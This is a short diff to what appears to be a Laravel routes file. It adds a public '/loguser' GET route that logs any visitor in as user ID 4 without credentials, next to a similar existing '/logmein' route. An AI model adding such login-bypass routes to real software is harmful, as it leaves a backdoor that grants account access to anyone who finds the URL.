@@ -41,6 +41,11 @@ Route::get('/logmein', function () {
     return redirect()->back();
 });
 
+Route::get('/loguser', function () {
+    Auth::LoginUsingId(4);
+    return redirect()->back();
+});
+
 Route::group(['namespace' => 'Frontend'], function () {
 
     Route::get('/', ['as' => 'home', 'uses' => 'HomeController@index']);
